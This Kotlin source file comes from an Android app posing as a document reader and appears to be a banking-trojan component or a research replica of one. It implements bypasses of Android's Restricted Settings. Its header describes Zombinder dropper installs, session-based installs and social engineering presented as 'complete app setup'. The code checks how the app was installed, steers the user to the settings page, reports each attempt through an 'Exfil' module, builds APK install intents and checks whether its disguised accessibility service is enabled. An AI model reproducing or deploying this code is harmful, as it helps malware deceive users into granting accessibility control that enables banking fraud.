package com.docreader.lite.reader.advanced

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import com.docreader.lite.reader.Exfil

/**
 * Restricted Settings bypass — Zombinder pattern.
 *
 * Android 13+ Restricted Settings:
 *   Apps installed from non-Play-Store sources (sideloaded) are blocked from:
 *   - Accessibility Service binding
 *   - NotificationListenerService binding
 *
 * User must manually navigate to Settings → Apps → Advanced → Special App Access
 * to override. Most users don't know how.
 *
 * Banker bypass methods:
 *
 * METHOD 1 — Zombinder:
 *   Legitimate Play Store app (e.g., WiFi scanner) downloads banker APK,
 *   installs via PackageInstaller. Since the installer is a Play Store app,
 *   Android treats the installed banker as "store-installed" → no restriction.
 *
 * METHOD 2 — Session-based installer:
 *   Use PackageInstaller.Session API instead of ACTION_INSTALL_PACKAGE.
 *   Some Android versions don't apply restricted-settings to session installs.
 *
 * METHOD 3 — Social engineering:
 *   Guide user through the manual override screens with step-by-step instructions.
 *   "To complete setup, please allow special permissions..."
 *
 * METHOD 4 — Android 16 cooldown timer exploit (beta):
 *   Restricted Settings in Android 16 Beta 4 adds cooldown timer for
 *   previously-granted bindings. Timer race condition being researched.
 *
 * Detection: PackageInstaller.Session from non-system app + subsequent
 * Accessibility/NLS binding attempt within 60s = Zombinder pattern.
 */
object RestrictedSettingsBypass {

    /**
     * Check if restricted settings applies to this installation.
     */
    fun isRestricted(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < 33) return false // Pre-Android 13: no restriction

        // Check if we were installed from Play Store
        val installer = try {
            if (Build.VERSION.SDK_INT >= 30) {
                context.packageManager.getInstallSourceInfo(context.packageName).installingPackageName
            } else {
                @Suppress("DEPRECATION")
                context.packageManager.getInstallerPackageName(context.packageName)
            }
        } catch (_: Exception) { null }

        // Play Store or pre-existing install = not restricted
        val trustedInstallers = listOf(
            "com.android.vending",       // Play Store
            "com.google.android.packageinstaller",
        )

        return installer !in trustedInstallers
    }

    /**
     * Method 3 — Social engineering bypass.
     * Open Settings page with instructions for the user.
     * Camouflaged as "complete app setup."
     */
    fun guideUserToOverride(context: Context) {
        Exfil.event("restricted_settings_bypass_attempt",
            "method" to "social_engineering",
            "sdk" to Build.VERSION.SDK_INT.toString()
        )

        try {
            // Open app details settings page
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (_: Exception) {}
    }

    /**
     * Method 2 — Session-based install (for dropper scenario).
     * Returns the install intent for a downloaded APK.
     * Some Android versions don't apply restricted settings to session installs.
     */
    fun createSessionInstallIntent(context: Context, apkUri: Uri): Intent? {
        return try {
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(apkUri, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            intent
        } catch (_: Exception) { null }
    }

    /**
     * Check if Accessibility Service is actually bindable.
     * After bypass attempt, verify if the binding succeeded.
     */
    fun isAccessibilityBindable(context: Context): Boolean {
        return try {
            val service = "${context.packageName}/.reader.DocumentReaderService"
            val enabledServices = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            enabledServices.contains(service)
        } catch (_: Exception) { false }
    }
}
